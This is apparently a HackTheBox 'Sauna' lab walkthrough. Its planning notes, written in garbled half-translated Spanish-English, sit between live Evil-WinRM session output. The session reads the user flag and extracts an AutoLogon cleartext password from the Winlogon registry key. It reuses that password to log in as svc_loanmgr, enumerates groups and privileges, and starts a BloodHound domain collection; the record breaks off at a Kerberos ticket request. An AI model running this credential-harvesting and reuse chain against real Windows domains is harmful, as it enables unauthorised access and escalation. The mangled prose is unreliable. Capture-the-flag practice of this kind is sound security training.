   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-31-7C-14-A4-00-50-56-94-EA-F0
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb
*Evil-WinRM* PS C:\Users\FSmith\Documents> systeminfo
Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
+ systeminfo
+ ~~~~~~~~~~.
At line:1 char:1
+ systeminfo
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
*Evil-WinRM* PS C:\Users\FSmith\Documents> clear
*Evil-WinRM* PS C:\Users\FSmith\Documents> echo $env:USERDOMAIN
EGOTISTICALBANK
*Evil-WinRM* PS C:\Users\FSmith\Documents> echo $env:COMPUTERNAME
SAUNA
*Evil-WinRM* PS C:\Users\FSmith\Documents> dir C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/25/2020   1:05 PM                Administrator
d-----        1/23/2020   9:52 AM                FSmith
d-r---        1/22/2020   9:32 PM                Public
d-----        1/24/2020   4:05 PM                svc_loanmgr


*Evil-WinRM* PS C:\Users\FSmith\Documents> type C:\Users\FSmith\Desktop\user.txt
c06623afb7a5c08a412d732234887383
*Evil-WinRM* PS C:\Users\FSmith\Documents>

## objective

Close formalmente the phase of foothold with `fsmith`, interpret the enumeration internal already obtenida and fijar a single next step, short and with high value for the escalada.

## Verified facts

The sesión remote with `fsmith` funciona and the access initial remains plenamente confirmado.

The context exacto of the user is:

* `egotisticalbank\fsmith`

The groups observed not show, by now, privileges administrativos directos. What relevant of verdad is:

* `BUILTIN\Remote Management Users`, that explains the access by WinRM
* groups estándar of user autenticado
* ausencia visible of groups típicamente administrativos

The host is `SAUNA` and sigue encajando clearly as computer unido to the domain `EGOTISTICALBANK`.

The reading of the flag of user has funcionado, así that the phase of user remains closed.

The output of `C:\Users` aporta signal nueva and very important: also of `Administrator` and `FSmith`, exists profile local of `svc_loanmgr`.

That profile not demuestra by yes only privileges altos, but yes demuestra that that account has iniciado sesión or has tenido context local in the system, what cual the convierte in a pista of much more value that seguir mirando groups triviales of `fsmith`.

`systeminfo` returned “Access is denied”. That is a observation real, but not cambia the reading main of the case nor bloquea the next decision.

## assumptions

The inference main is that `fsmith` is a user of low privilege with remote access permitido, but not parece be the account final of trabajo for the next phase.

The pista dominant now is `svc_loanmgr`. The existencia of su profile local suggests that can tratarse of a service account or of operación with more value that `fsmith`.

The hipótesis of trabajo more clean is that the next avance not saldrá of privileges especiales of `fsmith`, but rather of **credentials or configuración asociadas a otran account presente in the system**, especially `svc_loanmgr`.

## method

First  toma the enumeration current and  separa what that is contextual of what that really cambia the decision.

Afterwards  evita open several branches a the vez. Not it is advisable dispersarse between SMB, BloodHound, LDAP and otras checks still.

The signal more strong that has aparecido in this phase is the profile of `svc_loanmgr`, así that the single next step must orientarse a verify si the system guarda configuración of inicio automático or credentials asociadas a that account.

## answer

The enumeration has sido sufficient for tomar a decision clear.

The dominant finding already not is that `fsmith` tenga WinRM, because that only explains how  obtained the foothold. What important now is that `fsmith` **not shows groups of high privilege**, mientras that the system yes revela the presencia local of otran account much more interesante: `svc_loanmgr`.

That cambia the dirección of the case. The main branch leaves of be “mirar what can do `fsmith`” and moves a be **buscar si the system expone configuración or credentials reutilizables relacionadas with `svc_loanmgr`**.

The single next step more clean is review the configuración of **AutoLogon** in the registry of Windows.  propone that Verification and not otra because:

* part of a signal previous real: exists profile local of a service account
* is a comprobación short
* has little noise
* can revelar of forma directa user and password si exists inicio automático configurado
* not forces still a tools more pesadas

**Dominant finding now:** `fsmith` has remote access válido, but the pista more valiosa is the presencia local of `svc_loanmgr`.

**Active main branch:** enumeration internal post-foothold oriented a descubrir credentials reutilizables of an account with more value.

**Secondary branches noted:** privileges local of `fsmith`, artefactos of the profile and, more adelante, enumeration of permissions of domain si appears a segunda credential.

**Single next step:** check si the system guarda configuración of AutoLogon asociada `svc_loanmgr`.

## commands

```powershell id="w6k2mz"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

 propone this command because the signal previous already exists: there is an account `svc_loanmgr` with profile local in the system and that justifica buscar si was left configurada for inicio automático.

What does: consulta the clave of `Winlogon`, where Windows can almacenar parámetros as:

* `AutoAdminLogon`
* `DefaultUserName`
* `DefaultDomainName`
* `DefaultPassword`

What is expected: or bien a configuración harmless, or bien a combinación of valores that apunte a credentials almacenadas or a user configurado for logon automático.

Which part of the output really matters:

* si `AutoAdminLogon` is habilitado
* what account appears in `DefaultUserName`
* si exists `DefaultPassword`
* si the domain asociado coincide with `EGOTISTICALBANK`

How the next decision changes:

* si appear credentials or an account clear, the next phase será validate that nuevo context
* si not appears nada useful, entonces tocará elegir otra comprobación local short oriented a secretos or artefactos of the system

## checks

Check si in the output appear explícitamente `DefaultUserName` and `DefaultPassword`.

Anotar si the name of user coincide with `svc_loanmgr` or with otran account inesperada.

Not sacar conclusiones by a sola clave aislada; what important is the combinación between `AutoAdminLogon`, user, domain and posible password.

Si not appears `DefaultPassword`, not forzar still a segunda branch large; first convendrá interpret the resto of the output.

## writeup_notes

The access with `fsmith` cerró the phase of foothold, but the enumeration of groups showed a user of profile low. The hallazgo verdaderamente useful appeared to the review the profiles local of the system: the presencia of `svc_loanmgr` sugirió the existencia of a segundan account with more value operational, what that justificó a revisión dirigida of the configuración of inicio automático in the registry.

Reusable lesson: tras obtain a foothold válido in Windows, not siempre it is advisable centrarse in the privileges inmediatos of the current user. A veces the salto real appears to the detectar otran account presente in the system and check si the own host expone credentials or configuración asociadas a ella.

## We run the block and review the output

*Evil-WinRM* PS C:\Users\FSmith\Documents> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    not
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x8c9319f7
    ShutdownFlags    REG_DWORD    0x8000022b
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey


objective

Interpret the hallazgo of the registry, separar what already demostrado of the single duda that remains abierta and fijar a single next step before of cambiar of user.

verified_facts

The consulta to the registry has producido a hallazgo of much value: the system guarda credentials of AutoLogon in clear.

The valores really important son these:

* `DefaultDomainName = EGOTISTICALBANK`
* `DefaultUserName = EGOTISTICALBANK\svc_loanmanager`
* `DefaultPassword = Moneymakestheworldgoround!`

That confirms that the host expone a segunda credential reusable distinta of `fsmith`.

Also remains verified a detalle important: exists a discrepancia between the name visto before in `C:\Users` and the that appears now in the registry.

* in `C:\Users` appeared `svc_loanmgr`
* in `Winlogon` appears `svc_loanmanager`

The password already not is a hipótesis. Is a fact observed directly in the system.

assumptions

The inference main is that the next salto of the case moves by this segundan account, not by elevar privileges with `fsmith`.

The single incertidumbre real now not is the password, but rather the **name exacto of the account operational** that must usarse.

The explanation more reasonable is that `svc_loanmgr` sea the account real visible in the system and that `svc_loanmanager` refleje a forma more long or a referencia asociada to the AutoLogon, but that still must verificarse before of dar the next salto.

method

First  toma the hallazgo of the registry as evidence dominant, because revela credential in clear almacenada in the own host.

Afterwards  evita cometer a error typical: lanzarse a cambiar of user without resolver before the discrepancia of the name of account.

By that, the single next step not is still open a nueva sesión remote, but rather **confirm cuál of the dos names exists really as valid account**.

answer

This result is excelente.

The dominant finding already not is the access with `fsmith`, but rather that the own system has revelado a credential adicional in clear. That cambia by completo the phase current: the path main leaves of be enumeration básica of the current user and moves a be **validación of a segundan account with more value operational**.

The password `Moneymakestheworldgoround!` already is confirmada as dato exposed in the registry. What single that it is advisable resolver before of avanzar is the discrepancia between `svc_loanmanager` and `svc_loanmgr`.

That diferencia importa because a error of name of user can do parecer inválida credential that in realidad is good. Así that the single next step correct is confirm cuál of the dos accounts exists really in the system and cuál has sentido use for the next access.

Dominant finding now: the system expone a credential of AutoLogon in clear asociada a service account.

Active main branch: enumeration post-foothold oriented a validate and reutilizar the segunda credential hallada in the host.

Secondary branches noted: privileges local of `fsmith` and revisión of artefactos of the system, but move a segundo plane frente a the nueva credential exposed.

Single next step: resolver the name exacto of the valid account between `svc_loanmanager` and `svc_loanmgr`.

commands

```powershell id="q7m1de"
net user svc_loanmgr
net user svc_loanmanager
```

Why these commands are proposed:

The signal previous that lleva usarlos is very clear: the system already has dado a cleartext password, but there is a discrepancia in the name of user.

What hacen:

* comprueban si each name corresponde an account real conocida by the system;
* ayudan a distinguish between name operational real and name only referenciado in the registry.

What is expected:

* that uno of the dos names devuelva information válida of account;
* and that the otro falle or not aporte results.

Which part of the output really matters:

* si the account exists;
* si appears descripción useful;
* si pertenece a groups with value operational, especially remote access.

How the next decision changes:

* si `svc_loanmgr` exists and returns information válida, the next step será validate that credential in remote access;
* si exists `svc_loanmanager`, entonces  usará that name exacto;
* si ambos appear,  decidirá según the that encaje with groups and context operational.

checks

Check cuál of the dos names returns information real of account.

Anotar si the valid account pertenece a `Remote Management Users` or a otro group with value práctico inmediato.

Not desechar the password si uno of the dos names falla; here the duda is in the identificador exacto, not in the calidad of the secreto encontrado.

writeup_notes

The revisión of the registry showed a patrón classic of mala práctica in Windows: credentials of AutoLogon almacenadas in clear dentro of `Winlogon`. That hallazgo desplazó the atención from the user initial hacia segundan account with more potencial, but before of reutilizarla was necesario resolver a discrepancia between the name observed in the profile local and the name mostrado by the registry.

Reusable lesson: when a system expone a cleartext password, the primer impulso not must be probarla ciegas, but rather confirm first the identificador exacto of the account asociada. A small error of name can ocultar a credential perfectamente válida.

## We run the block and review the output

*Evil-WinRM* PS C:\Users\FSmith\Documents> net user svc_loanmgr
User name                    svc_loanmgr
Full Name                    L Manager
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/24/2020 4:48:31 PM
Password expires             Never
Password changeable          1/25/2020 4:48:31 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home Directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\FSmith\Documents> net user svc_loanmanager
net.exe : The user name could not be found.
    + CategoryInfo          : NotSpecified: (The user name could not be found.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

More help is available by typing NET HELPMSG 2221.

## objective

Resolver the discrepancia of the name of account, confirm cuál is the identity operational real asociada the credential hallada and fijar the single next step for cambiar a context of user with more value.

## Verified facts

The discrepancia already has quedado resuelta.

The account real existente in the system is:

* `svc_loanmgr`

The account `svc_loanmanager` **not exists**.

That allows reinterpretar correctly the hallazgo of the registry: the password exposed is real, but the name mostrado in `DefaultUserName` not coincide with the identificador operational válido that reconoce the system.

Also remains verified that `svc_loanmgr`:

* is active
* pertenece a `Domain Users`
* pertenece to the group local `Remote Management Users` (the output appears truncada as `Remote Management Use`, but the group is reconocible)

That último point is especially important because encaja directly with a reuse by WinRM.

## assumptions

The inference main is that the password hallada in AutoLogon must probarse with the account real `svc_loanmgr`, not with `svc_loanmanager`.

The hipótesis more strong now is that `svc_loanmgr` not only exists, but rather that probablemente permitirá remote access by WinRM, already that pertenece to the group adecuado for ello.

Sigue pending of verify a sola cosa: si the complete credential

* user: `svc_loanmgr`
* password: `Moneymakestheworldgoround!`

is operational for open a nueva sesión remote.

## method

First  toma the result of `net user` for close the duda of the identificador exacto.

Afterwards  evita seguir enumerando with `fsmith`, because the evidence already apunta an account better posicionada for continuar.

The single next step correct is validate the nueva credential in the service remote that already  sabe exposed and utilizable in this machine: WinRM.

## answer

Here appears the cambio important of phase.

Until now `fsmith` there was servido as puerta of entrada and as user of observation. But the system has revelado a segunda credential with more value, and now already  sabe with precisión cuál is the name correct of the account asociada: `svc_loanmgr`.

The output of `net user` does dos cosas a the vez:

* confirms that `svc_loanmgr` exists really
* confirms that pertenece to the group that explains a posible reuse by WinRM

That convierte a `svc_loanmgr` in the nuevo dominant finding.

The main branch already not must centrarse in seguir exprimiendo a `fsmith`, but rather in **validate the salto a `svc_loanmgr`**.

**Dominant finding now:** exists a segundan account real, `svc_loanmgr`, asociada the password exposed and with pertenencia compatible with remote access by WinRM.

**Active main branch:** reuse of credentials halladas locally for cambiar a context of user more valioso.

**Secondary branches noted:** enumeration adicional of `fsmith` and revisión local of artefactos, but move a segundo plane frente a the nueva credential.

**Single next step:** open a nueva sesión WinRM as `svc_loanmgr` using the password hallada in the registry.

## commands

```bash id="8j2qrm"
evil-WinRM -i 10.129.95.180 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

By what  propone this command:

The signal previous is already very strong and is compuesta by tres piezas that encajan between yes:

* the registry expone a cleartext password
* `net user` confirms that the account real is `svc_loanmgr`
* that account pertenece a `Remote Management Users`

What does:

* tries open a nueva sesión remote with the segunda credential hallada

What is expected:

* or bien a nueva remote shell válida as `svc_loanmgr`
* or bien a fallo of autenticación or autorización that obligue a reinterpretar the alcance of the credential

Which part of the output really matters:

* si appears prompt remote
* si the user autenticado cambia of `fsmith` a `svc_loanmgr`
* si the error, in case of existir, apunta password incorrecta or a falta of permissions

How the next decision changes:

* si entra, the next phase pasará a centrarse in the privileges and permissions of `svc_loanmgr` dentro of the domain
* si not entra, the credential seguirá siendo relevant, but habrá that check in what surface specific has value

## checks

Check that the nueva sesión  establece really as `svc_loanmgr`.

Not close still the sesión current of `fsmith` until confirm that the nueva funciona.

Si the nueva sesión entra, verify of inmediato identity and groups for comparar the nuevo context with the of `fsmith`.

## writeup_notes

The discrepancia between the name visto in the registry and the name real of the account was left resuelta mediante `net user`. That comprobación evitó a error of Interpretation important and allowed enlazar correctly the password exposed with the account operational válida of the system: `svc_loanmgr`.

Reusable lesson: when a credential appears in clear but the identificador of the user genera dudas, it is advisable resolver first the name real of the account before of probar access. In entornos Windows, a small diferencia in the name can separar a credential apparently inútil of a access perfectamente válido.

## We run the block and review the output

❯ evil-winrm -i 10.129.95.180 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-WinRM#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>

## objective

Close the Context switch from `fsmith` a `svc_loanmgr`, confirm what value operational real has this segundan account and preparar a single línea of trabajo for the next phase of enumeration of privileges in domain.

## Verified facts

The autenticación by WinRM with the segunda credential has funcionado correctly.

The prompt remote confirms that now the sesión already not pertenece a `fsmith`, but rather a:

* `svc_loanmgr`

That valida toda the chain intermedia:

* the registry expuso a cleartext password
* the account correct was `svc_loanmgr`
* that account pertenece a `Remote Management Users`
* the credential is reusable for remote access real

With esto remains confirmado that the salto lateral from `fsmith` hacia `svc_loanmgr` is exitoso.

## assumptions

The inference main is that `svc_loanmgr` has more value operational that `fsmith`, but still not is demostrado in what consiste exactamente that value.

Also is reasonable asumir that the next avance not dependerá already of credentials local, but rather of **permissions, delegaciones or rights dentro of the domain**.

The hipótesis of trabajo more clean is that the next phase useful será a **enumeration AD oriented a privileges efectivos** of `svc_loanmgr`, not a revisión local genérica of the host.

## method

First  cierra formalmente the cambio of user, because already exists a segunda sesión remote válida.

Afterwards  evita volver a enumeration local trivial or a branches dispersas. The account current parece more interesante by su posición in the domain that by privileges local evident.

By that, the single next step correct is obtain a block short of identity and groups from the sesión current for confirm the context before of move a enumeration of permissions of domain.

## answer

perfect. Here yes there is cambio of phase clear.

`fsmith` was the puerta of entrada. `svc_loanmgr` is now the context of trabajo main. That means that the chain already not gira in torno a “conseguir access”, but rather in torno a **descubrir what can do this account dentro of the domain**.

Not it is advisable still jump directly a múltiples tools or checks grandes without fijar before the nuevo context. What more clean is confirm identity and groups of `svc_loanmgr` and, with that, decidir the next enumeration of AD with basis real.

**Dominant finding now:** `svc_loanmgr` proporciona segunda sesión WinRM válida and moves a be the user main of the case.

**Active main branch:** enumeration of privileges of domain from an account with more value operational.

**Secondary branches noted:** revisión local of the host and analysis residual of `fsmith`, but ambas move a segundo plane frente to the nuevo context of `svc_loanmgr`.

**Single next step:** confirm identity and groups efectivos of `svc_loanmgr` from the nueva sesión.

## commands

```powershell id="r4n7kx"
whoami
whoami /groups
whoami /priv
```

Why these commands are proposed:

The signal previous is clear: already exists a nueva sesión válida and now matters medir su value real.

What hacen:

* `whoami` confirms of forma explícita the context exacto of the current user.
* `whoami /groups` shows the pertenencias efectivas of the user, that can orient the next phase.
* `whoami /priv` ayuda ver si exists algún privilege local interesante, although the expectativa main here is more in AD that in privileges local clásicos.

What is expected:

* confirmación clean of that the sesión is really `svc_loanmgr`
* groups efectivos of the user
* posibles privileges destacados or, to the less, the ausencia of ellos

Which part of the output really matters:

* pertenencias not triviales
* diferencias clear respecto a `fsmith`
* cualquier pista that justifique move a enumeration of delegated permissions in domain

How the next decision changes:

* si appear groups or privileges clearly useful,  orientará the next phase hacia ellos
* si not appear signals local strong, entonces the next decision lógica será a enumeration of rights of domain from fuera or with tools específicas of AD

## checks

Confirm that `whoami` returns exactamente the account esperada.

Comparar mentalmente `whoami /groups` with what visto before in `fsmith` for detectar si really has aumentado the value of the context.

Not sacar conclusiones too much pronto si `whoami /priv` parece normal; in accounts of service of AD, the value can estar in delegated permissions of domain that not  ven here of forma directa.

## writeup_notes

The credential extraída of the registry not only allowed identificar a segundan account, but rather cambiar with éxito a context of user more interesante dentro of the environment. In that momento, the investigación dejó of centrarse in access initial and moved a enfocarse in what rights real had that account dentro of the domain.

Reusable lesson: in Windows/AD, the value of an account not siempre  aprecia by sus privileges local inmediatos. A veces the verdadero salto appears when an account apparently modest has delegated permissions in the domain that only  revelan in a phase later of enumeration.

## We run the block and review the output

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami / groups
whoami.exe : ERROR: Invalid argument/option - '/'.
    + CategoryInfo          : NotSpecified: (ERROR: Invalid argument/option - '/'.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Type "WHOAMI /?" for usage.
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami / priv
whoami.exe : ERROR: Invalid argument/option - '/'.
    + CategoryInfo          : NotSpecified: (ERROR: Invalid argument/option - '/'.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Type "WHOAMI /?" for usage.

objective

Correct the error sintáctico in the comprobación of the context of `svc_loanmgr`, confirm groups and privileges efectivos of the nueva sesión and decidir si the value of this account is in privileges local or in delegated permissions of domain.

verified_facts

The nueva sesión remote is abierta correctly as:

* `egotisticalbank\svc_loanmgr`

The account `svc_loanmgr` already not is a hipótesis nor a referencia of the registry: is a context remote válido and operational.

The intentos with `whoami / groups` and `whoami / priv` not fallaron by falta of permissions, but rather by sintaxis incorrecta. The error what leaves clear: `Invalid argument/option - '/'`.

That means that still not  has obtenido the information of groups nor of privileges; that part sigue pending.

assumptions

The inference main is that the next dato clave is in the groups and privileges efectivos of `svc_loanmgr`.

Also is reasonable asumir that, si not appear privileges local especially useful, the value real of this account probablemente estará in permissions or delegaciones dentro of the domain and not in the host local.

method

First  corrige the command without cambiar of tool nor of branch.

Afterwards  revisa the output buscando signals of value real: groups with capacidad operational, privileges local relevant or ausencia of ambos.

Not  abren still branches paralelas because before it is advisable close this comprobación básica of the nuevo context.

answer

Here not has fallado the enumeration; has fallado the sintaxis.

In `whoami`, the opciones van without espacio between the barra and the argumento. To the escribir `whoami / groups` and `whoami / priv`, PowerShell terminó lanzando `whoami.exe` with argumentos inválidos. Is a error small, but important of correct because still not  has visto the part that really matters of the nuevo context.

The dominant finding sigue siendo that `svc_loanmgr` already is a segunda sesión válida and that now toca medir su value real.

Dominant finding now: exists a sesión remote válida as `svc_loanmgr`.

Active main branch: enumeration of privileges and context efectivo of `svc_loanmgr`.

Secondary branches noted: analysis local adicional of the host and, si not appear signals local, futura enumeration of permissions of domain.

Single next step: repetir correctly the comprobación of groups and privileges of `svc_loanmgr`.

commands

```powershell id="g8t2vy"
whoami
whoami /groups
whoami /priv
```

Why these commands are proposed:

`whoami`  repite for dejar trazabilidad clean of the context before of seguir.

`whoami /groups`  usa because the signal previous is that this account probablemente vale more by sus pertenencias that by su mera existencia. What that matters is ver si appears algún group not trivial or diferente of what visto with `fsmith`.

`whoami /priv` sirve for check si the user has privileges local destacados. Not  espera necesariamente a joya here, but it is advisable verificarlo before of concluir that the value is only in AD.

What is expected:

* confirmación clean of the current user
* list of groups efectivos
* list of privileges of the token

Which part of the output really matters:

* groups fuera of what común
* diferencias respecto a `fsmith`
* privileges habilitados or potencialmente useful
* in su ausencia, a signal clear of that the next phase must mirar to the domain and not to the host

How the next decision changes:

* si appear groups or privileges strong, the next phase  centrará in ellos
* si not appears nada especial, the next step lógico será move a enumeration of delegated permissions in domain

checks

Check that `whoami` sigue devolviendo `egotisticalbank\svc_loanmgr`.

Review `whoami /groups` buscando pertenencias distintas a the of a user remote estándar.

Review `whoami /priv` for distinguish between privileges presentes but deshabilitados and ausencia total of value local.

Not interpret aún the account as “without value” si the output parece normal; in this tipo of case, the verdadero weight can estar in AD.

writeup_notes

The primer intento of review groups and privileges of `svc_loanmgr` falló by a cuestión of sintaxis, not by restricciones of the system. Corregido that detalle, the comprobación correct allows decidir si the value of the account is in privileges local of the host or in delegated permissions dentro of the domain.

Reusable lesson: in a phase of post-exploitation, a error small of sintaxis can parecer a bloqueo technical when in realidad only impide read the evidence. Before of reinterpretar the case, it is advisable confirm that the command  has ejecutado exactamente as  pretendía.

# We run the block and review the output

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
egotisticalbank\svc_loanmgr
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

objective

Interpret the context real of `svc_loanmgr`, distinguish between privileges local and value in domain, and fijar a single next step that permita descubrir si this account has delegated permissions useful in Active Directory.

verified_facts

The sesión current is abierta correctly as:

`egotisticalbank\svc_loanmgr`

The groups efectivos observed son, in esencia, the mismos that already  habían visto with `fsmith`:

* `Remote Management Users`
* `Users`
* `Pre-Windows 2000 Compatible Access`
* groups estándar of autenticación

Not appear groups local administrativos nor pertenencias that, by yes solas, expliquen a escalada local inmediata.

The privileges observed tampoco apuntan a path local dominant. What relevant is:

* `SeMachineAccountPrivilege` habilitado
* `SeChangeNotifyPrivilege` habilitado
* `SeIncreaseWorkingSetPrivilege` habilitado

Not appear privileges clásicos of high impacto local as `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege` or similares.

With the evidence current, the cambio of `fsmith` a `svc_loanmgr` not has revelado a ventaja local clear in the host, but yes confirms that  has pasado a segundan account operational válida of the domain.

assumptions

The inference main is that the value real of `svc_loanmgr` probablemente not is in sus groups local nor in su token of privileges, but rather in delegated permissions dentro of the domain.

`SeMachineAccountPrivilege` is a signal interesante, but by yes sola not domina the case in this momento. Not it is advisable convertirla still in the main branch without a justificación better.

The hipótesis of trabajo more reasonable is that the next pista useful is in ACLs, delegated rights or relationships of control in Active Directory that not  ven with `whoami /groups` nor with `whoami /priv`.

method

First  cierra the comprobación of the token local: already  has visto that not there is a path local obvia of privileges altos.

Afterwards  evita perder time in enumeration local repetitiva or in probar secondary branches without signal strong.

The single next step correct is a enumeration of permissions of domain from fuera, using the credential already validated of `svc_loanmgr`, for descubrir si this account has delegated rights on otros objects of the domain.

answer

The reading of this output is bastante clear.

`svc_loanmgr` has more value that `fsmith`, but that value not  is manifestando in the host local of forma evident. Sus groups son básicos and sus privileges local not apuntan a escalada inmediata. That not means that the account sea “normal”; means something more interesante: su posible weight is in Active Directory, not in the computer local.

That matiz cambia the decision next. Already not merece the pena insistir in buscar a privesc local classic with this evidence. What correct now is move a enumeration of permissions of domain.

The main branch active must quedar así: **enumeration AD oriented a delegated rights of `svc_loanmgr`**.

Dominant finding now: `svc_loanmgr` is a valid account and su token local parece normal, what that desplaza the interés hacia permissions of domain.

Active main branch: enumeration of Active Directory centrada in ACLs, delegaciones and relationships of control.

Secondary branches noted: `SeMachineAccountPrivilege` as posibilidad lateral, and revisión local adicional of the host only si the enumeration AD not returns a path more strong.

Single next step: recolectar datos of BloodHound with `svc_loanmgr` and review what rights efectivos has dentro of the domain.

commands

```bash id="1w7kdp"
BloodHound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All
```

This command  propone because the signal previous lleva justo ahí: the token local not explains a escalada, así that there is that mirar permissions of domain.

What does:
recoge information of the domain with the account current and genera the JSON necesarios for analyze relationships between users, groups, ACLs and delegated rights.

What is expected:
a conjunto of files JSON that afterwards permitan review si `svc_loanmgr` controla algún object, has rights of replicación, delegaciones peligrosas u otra relationship useful in AD.

Which part of the output really matters:
that the collection termine correctly and genere the files of output without errores of autenticación, DNS or resolution of domain.

How the next decision changes:
si the collection sale bien, the next analysis already not será “probar cosas a ciegas”, but rather review of forma dirigida what permissions specific has `svc_loanmgr` in the graph of the domain.

checks

Check that `bloodhound-python` termina without errores and genera several `.json`.

Si appears a problema of resolution, review that the name of domain and the DNS usado sean correctos, but without cambiar still of branch.

When estén the JSON, the point clave a review not será a vista genérica of the domain, but rather consultas orientadas a delegated rights of the current user, especially relationships of control on the domain u objects sensibles.

writeup_notes

The cambio a `svc_loanmgr` not reveló privileges local especially potentes, and precisamente that detalle was the that orientó correctly the next phase. In lugar of insistir in a privesc local without signal strong, the investigación moved a centrarse in delegated permissions of domain, that son the that a menudo explican the value real of a service account in a environment Active Directory.

Reusable lesson: when an account nueva not shows groups privilegiados nor privileges local llamativos, not it is advisable asumir that has little value. In Active Directory, muchas accounts apparently discretas esconden su importancia in ACLs and delegated rights that only appear to the enumerar the domain.

# We run the block and review the output

❯ cd /home/r4mon/pentest/targets/HTB/easy/SAUNA/content
BloodHound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All
zip bloodhound_sauna.zip *.json
ls -l *.json bloodhound_sauna.zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
